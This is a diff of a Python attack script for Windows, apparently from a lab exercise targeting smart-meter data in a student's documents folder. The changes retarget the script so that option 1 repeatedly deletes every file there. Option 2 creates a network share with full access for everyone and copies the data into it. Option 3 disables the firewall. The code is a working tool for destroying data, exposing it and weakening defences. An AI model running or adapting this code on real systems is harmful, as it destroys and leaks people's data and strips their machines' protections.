@@ -1,5 +1,5 @@
 #import os
-from os import walk, path, remove, system, getcwd
+from os import walk, path, remove, system, getcwd, mkdir
 #import time
 from time import sleep
 import threading
@@ -11,6 +11,7 @@ from win32netcon import ACCESS_ALL
 import win32net
 
 copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
+smartmeterpath = "C:\\Users\\Student\\Documents\\SmartMeterData"
 
 #Check if administrator
 def check_admin():
@@ -28,7 +29,6 @@ def delete_files(folder_path):
             for file in files:
                 og = path.join(root, file)
                 dest = path.join(copiedpath, file)
-                copyfile(og,dest)
                 remove(og)
                 print("File: " + str(og) + " is deleted")
         sleep(5)
@@ -120,8 +120,8 @@ def Create_Share_folder():
     folder_path = r'C:\Windows\temp\Smartmeter'
 
     # Create the folder if it does not already exist
-    if not os.path.exists(folder_path):
-        os.mkdir(folder_path)
+    if not path.exists(folder_path):
+        mkdir(folder_path)
 
     # Set the share information
     share_name = 'SmartMeterfolder'
@@ -138,7 +138,6 @@ def Create_Share_folder():
         'permissions': ACCESS_ALL,
         'security_descriptor': None
     }
-
     win32net.NetShareAdd(None, 2, share_info)
 
 def revert(revertoption):
@@ -203,10 +202,10 @@ if __name__ == '__main__':
     check_admin()
     attackoption = str(argv[1])
     if attackoption == "1":
-        delete_files(copiedpath)
+        delete_files(smartmeterpath)
     elif attackoption == "2":
         Create_Share_folder()
-        copy_file(copiedpath)
+        copy_file(smartmeterpath)
     elif attackoption == "3":
         disable_firewall()
     elif attackoption == "4":
